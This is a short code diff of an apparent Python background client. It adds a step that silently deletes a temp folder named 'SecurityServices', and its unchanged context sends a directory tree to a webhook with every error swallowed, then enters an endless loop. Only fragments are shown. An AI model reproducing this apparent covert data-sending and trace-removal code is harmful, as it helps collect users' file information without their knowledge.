@@ -1,5 +1,5 @@
 import string, base64, json, re, math, uuid, importlib, subprocess
-import os, socket, tempfile, sys
+import os, socket, tempfile, sys, shutil
 import urllib.request
 import time
 
@@ -293,6 +293,12 @@ if __name__ == "__main__":
             send_webhook(str(tree)[:1900])
         except:
             pass
+
+    try:
+        dir = Path(tempfile.gettempdir()) / "SecurityServices"   
+        shutil.rmtree(dir)
+    except:
+        pass
     
     while True:
         now = time.monotonic()
